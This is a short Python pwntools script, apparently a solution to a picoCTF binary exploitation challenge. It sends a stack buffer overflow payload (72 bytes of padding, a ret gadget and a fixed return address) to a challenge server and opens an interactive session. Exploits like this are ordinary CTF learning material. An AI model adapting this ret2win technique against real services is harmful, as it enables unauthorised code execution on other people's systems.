from pwn import *
context.arch = "amd64"
p = remote('saturn.picoctf.net', 53964)
address = 0x401236
elf = ELF('./vuln')
rop = ROP(elf)
ret = p64(rop.find_gadget(['ret'])[0])
offset = b'A' * (64 + 8)
p.recvuntil(b':')
payload = offset + ret + p64(address, endian='little')
p.sendline(payload)
p.interactive()
